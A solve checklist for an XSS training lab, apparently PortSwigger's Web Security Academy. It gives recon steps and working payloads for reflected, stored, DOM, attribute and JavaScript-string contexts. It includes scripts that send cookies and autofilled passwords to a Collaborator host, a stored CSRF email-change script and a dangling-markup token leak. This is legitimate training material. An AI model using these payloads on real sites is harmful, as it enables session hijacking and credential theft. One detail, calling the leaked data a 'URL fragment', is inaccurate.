# XSS Mystery Lab — Solve Checklist

---

## Initial Recon — Run These First

Work through each step in order. Fill in the notes fields as you go — your findings here will point you directly to the right lab section.

---

### Step 1 — Check Response Headers (CSP)

In Burp Suite, intercept any page request and inspect the **Response** tab. Look for a `Content-Security-Policy` header.

- [ ] Is there a `Content-Security-Policy` header present?
  - **No CSP** → Standard XSS payloads will work. Continue recon normally.
  - **CSP present with `script-src 'self'` or `script-src 'nonce-...'`** → Inline scripts are blocked. Look for a script gadget, a dangling markup opportunity, or a CSP bypass via policy injection. Go to **Section 6**.
  - **CSP present but allows `unsafe-inline`** → CSP is effectively not blocking inline scripts. Treat as no CSP.
  - **CSP present with specific allowed domains** → Check if any of those domains host a JSONP endpoint or an AngularJS file you could abuse.
- [ ] In Burp, go to **Proxy > HTTP History**, click a page request, click the **Response** tab, and press `Ctrl+F` to search for `content-security-policy`.

> **📝 CSP header value (paste it here):**
> ```
>
>
> ```

---

### Step 2 — Map All Input Points

Browse the entire lab app and list every place user input is accepted. Test each one — the vulnerability could be in any of them.

- [ ] **Search box** — submit `xsstest1234` and check if it appears on the results page.
- [ ] **URL parameters** — look at the address bar after a search or navigation. E.g. `?search=xsstest1234`, `?returnPath=xsstest1234`, `?storeId=xsstest1234`. Manually edit each param.
- [ ] **Comment / post forms** — submit `xsstest1234` in every field (name, email, website, body) and view the result page to see where each one is reflected.
- [ ] **URL fragment (`#`)** — try appending `#xsstest1234` to the URL and check the page source / browser console. Some DOM sinks read `location.hash`.
- [ ] **Hidden form fields** — right-click > Inspect on any form to check for `<input type="hidden">` fields. Note their names and values.
- [ ] **HTTP request headers** — in Burp Repeater, try injecting the canary into the `Referer` and `User-Agent` headers and check if they appear reflected in any page response.

> **📝 Input points found:**
> ```
> Search box:        YES / NO
> URL params:
> Comment fields:
> URL fragment:
> Hidden fields:
> Headers:
> Other:
> ```

---

### Step 3 — Determine Reflection Context

For each input point that reflects your canary, right-click the results page → **View Page Source** (not DevTools — source view shows the raw server response). Search for `xsstest1234` and look at exactly what surrounds it.

- [ ] **Between HTML tags** — canary appears as bare text, e.g. `<p>xsstest1234</p>`
  → Try `<script>alert(1)</script>` or `<img src=1 onerror=alert(1)>`. Go to **Section 1**.
- [ ] **Inside an HTML attribute value (double-quoted)** — e.g. `value="xsstest1234"` or `src="xsstest1234"`
  → Try `"onmouseover="alert(1)` to break out. If it's an `href`, try `javascript:alert(1)`. Go to **Section 3**.
- [ ] **Inside an HTML attribute value (single-quoted)** — e.g. `value='xsstest1234'`
  → Try `'onmouseover='alert(1)`.
- [ ] **Inside a JavaScript string (single-quoted)** — e.g. `var x = 'xsstest1234';`
  → Try `'-alert(1)-'`. Go to **Section 4**.
- [ ] **Inside a JavaScript string (double-quoted)** — e.g. `var x = "xsstest1234";`
  → Try `"-alert(1)-"`. Go to **Section 4**.
- [ ] **Inside a JS template literal** — e.g. `` var x = `hello xsstest1234`; ``
  → Try `${alert(1)}`. Go to **Section 4 — template literal lab**.
- [ ] **Inside a `<script>` block but not in a string** — e.g. `var x = xsstest1234;`
  → Try injecting directly: `alert(1)`.
- [ ] **Not in page source at all** — the reflection may be DOM-based (written by JS after page load). Open **DevTools > Console** and check for JS errors, or use DOM Invader. Go to **Step 5**.

> **📝 Reflection context found:**
> ```
> Input point:
> Surrounding HTML (paste snippet):
>
>
> Context type:
> ```

---

### Step 4 — Check for DOM Sinks

If your canary didn't appear in the raw page source, or you see JavaScript manipulating the page, check for client-side sinks. Open **DevTools > Sources** (or use Burp's built-in search) and search the JS files for the following.

- [ ] Search JS source for **`document.write(`** — if found, check what variable it writes and trace where that variable gets its value. If it comes from `location.search` or `location.hash`, it's a DOM XSS source. Go to **Section 2 — document.write lab**.
- [ ] Search JS source for **`innerHTML`** — if found, trace the value being assigned. `<script>` tags won't execute via innerHTML — use `<img src=1 onerror=alert(1)>`. Go to **Section 2 — innerHTML lab**.
- [ ] Search JS source for **`location.hash`** — if the hash value is passed into a jQuery selector `$(location.hash)` or written to the DOM, it's exploitable. Go to **Section 2 — hashchange or document.write lab**.
- [ ] Search JS source for **`$.(`** or **`jQuery(`** — check if any user-controlled value is passed as the selector argument. Go to **Section 2 — jQuery labs**.
- [ ] Search JS source for **`eval(`** or **`setTimeout(`** or **`setInterval(`** with a string argument — these are JS execution sinks. Trace the input source.
- [ ] Search JS source for **`location.href =`** or **`element.setAttribute('href',`** — if user input controls an href value, try `javascript:alert(1)`. Go to **Section 3 — href lab**.
- [ ] Check the page HTML for **`ng-app`** or **`ng-controller`** attributes — this indicates AngularJS. Go to **Section 2 — AngularJS lab**.

> **📝 DOM sinks found:**
> ```
> Sink type:
> Variable name:
> Source (where does the value come from?):
> Relevant JS snippet:
>
>
> ```

---

### Step 5 — Probe What is Filtered or Encoded

Once you know the context, test which characters and keywords survive. Submit each test string individually and view the page source to see how each is handled.

**Character encoding tests — submit each, check raw source:**

- [ ] `<` — is it encoded to `&lt;`? → Angle brackets are blocked. You cannot inject new tags.
- [ ] `>` — is it encoded to `&gt;`?
- [ ] `"` — is it encoded to `&quot;`? → Cannot break out of double-quoted attributes.
- [ ] `'` — is it encoded to `&#x27;` or escaped to `\'`? → Cannot break out of single-quoted strings/attributes directly.
- [ ] `` ` `` — is it encoded or escaped? → Relevant if the context is a template literal.
- [ ] `\` — is it doubled to `\\`? → Server is escaping backslashes (see **Section 4 — backslash lab**).

**Keyword/tag tests — submit each as a search query:**

- [ ] `<script>` — blocked (400) or reflected?
- [ ] `<img src=1 onerror=x>` — blocked or reflected?
- [ ] `<svg onload=x>` — blocked or reflected?
- [ ] `<body onresize=x>` — blocked or reflected?
- [ ] `javascript:` — stripped or reflected in href context?
- [ ] `alert(` — stripped or reflected?
- [ ] `print(` — stripped or reflected?

> **📝 Filter findings:**
> ```
> < encoded:      YES / NO
> > encoded:      YES / NO
> " encoded:      YES / NO
> ' encoded:      YES / NO  | escaped with \: YES / NO
> \ doubled:      YES / NO
> <script> blocked:    YES / NO
> <img onerror> blocked: YES / NO
> <svg onload> blocked:  YES / NO
> <body> blocked:      YES / NO
> javascript: stripped:  YES / NO
> alert( stripped:     YES / NO
> ```

---

### Step 6 — Identify Reflected vs Stored vs DOM

- [ ] **Reflected** — your input appears in the response immediately and only when you send it. The URL contains your payload. The victim must be sent a crafted URL.
- [ ] **Stored** — your input is saved (e.g. a comment) and appears every time the page loads for any user. No crafted URL needed — just post the payload.
- [ ] **DOM-based** — your input never appears in the raw HTTP response from the server. It's inserted into the DOM entirely by client-side JavaScript. Check with **View Source** (not DevTools inspector) — if your canary isn't there, it's DOM-based.
- [ ] **DOM + Reflected** — the server reflects data into a JS variable, and client-side JS then writes it to the DOM. Both Burp and DevTools are needed to trace the full flow.

> **📝 XSS type:**
> ```
>
>
> ```

---

### Step 7 — Match to a Lab Section

Use your findings above to jump to the right section:

| What you found | Go to |
|---|---|
| Canary between HTML tags, no encoding | Section 1 |
| Canary in an HTML attribute, `<>` encoded | Section 3 — attribute lab |
| Canary in an `href` value | Section 3 — href lab |
| Canary in a JS string, `'` not encoded | Section 4 — angle brackets encoded lab |
| Canary in a JS string, `\` escaping `'` | Section 4 — backslash escaped lab |
| Canary in a JS string, `'` escaped AND `\` escaped | Section 4 — double escape lab |
| Canary in onclick attribute, `'` escaped | Section 4 — onclick lab |
| Canary in a template literal | Section 4 — template literal lab |
| `document.write` sink | Section 2 — document.write lab |
| `innerHTML` sink | Section 2 — innerHTML lab |
| jQuery `href` sink | Section 2 — jQuery href lab |
| jQuery `hashchange` | Section 2 — hashchange lab |
| `<select>` + `document.write` | Section 2 — select element lab |
| AngularJS `ng-app` | Section 2 — AngularJS lab |
| Reflected into DOM via JS variable | Section 2 — reflected DOM lab |
| Stored into DOM sink | Section 2 — stored DOM lab |
| WAF blocking most tags | Section 3 — WAF lab (Intruder fuzz) |
| Canary in `<link rel=canonical>` | Section 3 — canonical link lab |
| CSP present, script blocked | Section 6 — dangling markup lab |
| Goal = steal cookies | Section 5 — cookie lab |
| Goal = capture password | Section 5 — password lab |
| Goal = perform CSRF | Section 5 — CSRF lab |

> **📝 General notes / anything that doesn't fit above:**
> ```
>
>
>
>
>
> ```

---

## Section 1 — Reflected & Stored: Basic HTML Context

### 🟦 [APPRENTICE] Reflected XSS — HTML context, nothing encoded
**Goal:** `alert()`

- [ ] Submit `<script>alert(1)</script>` in the search box.
- [ ] Click Search — alert fires immediately.

---

### 🟦 [APPRENTICE] Stored XSS — HTML context, nothing encoded
**Goal:** `alert()`

- [ ] Go to a blog post and submit a comment.
- [ ] Enter `<script>alert(1)</script>` in any comment field.
- [ ] Post the comment — alert fires when the page loads.

---

## Section 2 — DOM-Based XSS

### 🟦 [APPRENTICE] DOM XSS — document.write sink via location.search
**Goal:** `alert()`

- [ ] View source — find JS using `document.write()` with data from `location.search`.
- [ ] Inject into the search box: `"><svg onload=alert(1)>`
- [ ] Alternatively close the existing tag context: `"><script>alert(1)</script>`

---

### 🟦 [APPRENTICE] DOM XSS — innerHTML sink via location.search
**Goal:** `alert()`

- [ ] View source — find JS assigning `innerHTML` from the search query param.
- [ ] `<script>` won't execute via innerHTML — use: `<img src=1 onerror=alert(1)>`
- [ ] Submit the payload in the search box.

---

### 🟦 [APPRENTICE] DOM XSS — jQuery href attribute sink via location.search
**Goal:** `alert()`

- [ ] Find the 'back' link that uses jQuery to set its `href` from a URL param (e.g. `?returnPath=`).
- [ ] Inject: `javascript:alert(document.cookie)` as the param value.
- [ ] Click the back link to trigger execution.

---

### 🟩 [PRACTITIONER] DOM XSS — jQuery hashchange event
**Goal:** `print()`

- [ ] Identify the page uses jQuery `$(window).on('hashchange'...)` and passes `location.hash` to `$(...)`.
- [ ] The sink is the jQuery selector — inject via the hash.
- [ ] Host an iframe on the exploit server:
  ```html
  <iframe src="LAB-URL/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
  ```
- [ ] Deliver to victim.

---

### 🟩 [PRACTITIONER] DOM XSS — document.write inside select element
**Goal:** `alert()`

- [ ] Find a page writing a `<select>` element via `document.write` from a URL param (often `?storeId=`).
- [ ] Inject: `"></select><img src=1 onerror=alert(1)>` as the param value.
- [ ] This breaks out of the select element and fires the onerror handler.

---

### 🟩 [PRACTITIONER] DOM XSS — AngularJS expression in ng-app
**Goal:** `alert()`

- [ ] Confirm the page uses AngularJS (look for `ng-app` attribute on a tag).
- [ ] Enter in the search box: `{{$on.constructor('alert(1)')()}}`
- [ ] AngularJS evaluates template expressions — this escapes the sandbox and executes.

---

### 🟩 [PRACTITIONER] Reflected DOM XSS
**Goal:** `alert()`

- [ ] Find the JS that processes the search query and reflects it into a DOM sink (look for `eval()` or similar).
- [ ] The typical payload breaks out of a JSON string: `\'-alert(1)//`
- [ ] The backslash escapes the server's added backslash; the single quote terminates the string.

---

### 🟩 [PRACTITIONER] Stored DOM XSS
**Goal:** `alert()`

- [ ] Post a comment — find where comment data is replayed into a DOM sink (`innerHTML`).
- [ ] Payload bypassing `<>` HTML encoding on first char: `<><img src=1 onerror=alert(1)>`
- [ ] The extra `<>` prefix absorbs the encoding; the rest executes.

---

## Section 3 — XSS Context: Attribute & Tag Escapes

### 🟦 [APPRENTICE] Reflected XSS — into attribute, angle brackets HTML-encoded
**Goal:** `alert()`

- [ ] Confirm canary string lands inside a quoted HTML attribute (e.g. `value="canary"`).
- [ ] Inject: `"onmouseover="alert(1)`
- [ ] Move the mouse over the element to trigger — or craft the URL for the victim.

---

### 🟦 [APPRENTICE] Reflected XSS — into href attribute, double quotes HTML-encoded
**Goal:** `alert()`

- [ ] Locate a link whose `href` is set from user input (e.g. a website field).
- [ ] Inject a javascript URI: `javascript:alert(1)`
- [ ] Click the link — or have the victim click it.

---

### 🟩 [PRACTITIONER] Reflected XSS — most tags & attributes blocked (WAF)
**Goal:** `print()` — no user interaction

- [ ] Use Burp Intruder to fuzz allowed tags: send `<§tag§>` with the XSS cheat sheet tags list.
- [ ] Identify `<body>` returns 200.
- [ ] Fuzz allowed events on `<body%20§event§=1>` — identify `onresize` returns 200.
- [ ] Host on exploit server (replace `YOUR-LAB-ID`):
  ```html
  <iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload="this.style.width='100px'"></iframe>
  ```
- [ ] Deliver to victim.

---

### 🟩 [PRACTITIONER] Reflected XSS — all standard tags blocked
**Goal:** `alert()`

- [ ] Fuzz tags with Intruder — find that SVG/custom HTML tags are allowed (e.g. `<svg>`, `<animate>`, custom tags).
- [ ] Payload using SVG animate:
  ```html
  <svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
  ```
- [ ] Or use a custom tag with onfocus + autofocus:
  ```html
  <xss id=x onfocus=alert(1) tabindex=1>
  ```
  Then append `#x` to the URL to focus the element.

---

### 🟩 [PRACTITIONER] Reflected XSS — into canonical link tag
**Goal:** `alert()`

- [ ] Confirm input is reflected in a `<link rel=canonical href='...'>` tag.
- [ ] Inject an accesskey payload: `'accesskey='x'onclick='alert(1)`
- [ ] Full URL: `https://LAB-URL/?'accesskey='x'onclick='alert(1)`
- [ ] Victim presses ALT+SHIFT+X (Chrome on Windows/Linux) or CTRL+ALT+X (Mac) to trigger.

---

## Section 4 — XSS Context: JavaScript String Escapes

### 🟦 [APPRENTICE] Reflected XSS — into JS string, angle brackets HTML-encoded
**Goal:** `alert()`

- [ ] Confirm input lands inside a JS string: `var x = 'canary';`
- [ ] Single quotes are not encoded — inject: `'-alert(1)-'`
- [ ] This terminates the string and calls alert.

---

### 🟩 [PRACTITIONER] Reflected XSS — JS string, single quote & backslash escaped
**Goal:** `alert()`

- [ ] Single quote is escaped with `\` and backslash itself is also escaped — can't break out of the string directly.
- [ ] Instead escape the script block at the HTML level: `</script><script>alert(1)</script>`
- [ ] The HTML parser closes the script tag before the JS parser processes the escaping.

---

### 🟩 [PRACTITIONER] Reflected XSS — JS string, angle brackets & double quotes encoded, single quotes escaped
**Goal:** `alert()`

- [ ] Angle brackets HTML-encoded, double quotes encoded, single quote backslash-escaped.
- [ ] The server escapes `'` to `\'` — inject a second backslash to escape the server's backslash:
- [ ] Payload: `\'-alert(1)//`
  - Server turns `\'` into `\\'` — the double backslash cancels out, freeing the single quote.

---

### 🟩 [PRACTITIONER] Reflected XSS — onclick event, angle brackets & double quotes encoded, single quotes backslash-escaped
**Goal:** `alert()`

- [ ] Input lands inside an `onclick` attribute already wrapped in single quotes: `onclick='...'`
- [ ] Single quotes are backslash-escaped by server — use HTML entities instead (decoded before JS execution):
- [ ] Payload: `&apos;-alert(1)-&apos;`

---

### 🟩 [PRACTITIONER] Reflected XSS — into JS template literal, various chars escaped
**Goal:** `alert()`

- [ ] Confirm input lands in a template literal: `` `...${canary}...` ``
- [ ] Angle brackets, quotes, and backslashes are escaped — but `${...}` expressions still evaluate inside backtick strings.
- [ ] Payload: `${alert(1)}`

---

## Section 5 — Exploitation Labs

### 🟩 [PRACTITIONER] Exploiting XSS — steal cookies via Burp Collaborator
**Goal:** Hijack victim session

- [ ] Open Burp Collaborator and copy your subdomain.
- [ ] Post a blog comment with:
  ```html
  <script>
  fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
    method: 'POST',
    mode: 'no-cors',
    body: document.cookie
  });
  </script>
  ```
- [ ] Poll Collaborator — grab the victim's cookie from the POST body.
- [ ] Use Burp Repeater to replace your session cookie with the stolen one.

---

### 🟩 [PRACTITIONER] Exploiting XSS — capture passwords via autocomplete
**Goal:** Steal credentials

- [ ] Post a comment injecting fake username/password inputs that exfiltrate on change:
  ```html
  <input name=username id=username>
  <input type=password name=password onchange="fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{method:'POST',mode:'no-cors',body:username.value+':'+this.value})">
  ```
- [ ] Password manager auto-fills the fields — `onchange` fires and exfiltrates to Collaborator.
- [ ] Poll Collaborator, retrieve credentials, and log in as the victim.

---

### 🟩 [PRACTITIONER] Exploiting XSS — perform CSRF (change email)
**Goal:** Change victim's email

- [ ] Log in as `wiener:peter` and observe the change-email form — note the CSRF token location.
- [ ] Post a stored XSS payload that fetches the victim's account page, extracts the CSRF token, then submits the form:
  ```html
  <script>
  var req = new XMLHttpRequest();
  req.onload = handleRes;
  req.open('GET', '/my-account');
  req.send();
  function handleRes() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var req2 = new XMLHttpRequest();
    req2.open('POST', '/my-account/change-email');
    req2.send('email=pwned@evil.com&csrf=' + token);
  }
  </script>
  ```
- [ ] Post as a blog comment — when victim views it, their email is changed.

---

## Section 6 — CSP / Dangling Markup

### 🟩 [PRACTITIONER] Dangling markup — strict CSP, exfiltrate CSRF token
**Goal:** Change victim's email

- [ ] A strict CSP blocks script execution — use dangling markup to steal the CSRF token.
- [ ] Inject an unclosed `<img>` tag that slurps up subsequent HTML (including the CSRF token) as its src:
  ```
  "><img src='https://BURP-COLLABORATOR-SUBDOMAIN?x=
  ```
  Leave the `src` attribute and tag unclosed.
- [ ] The browser sends the page content (including the CSRF token) to your Collaborator server as a URL fragment.
- [ ] Extract the CSRF token from the Collaborator request and submit the email-change request manually on behalf of the victim.
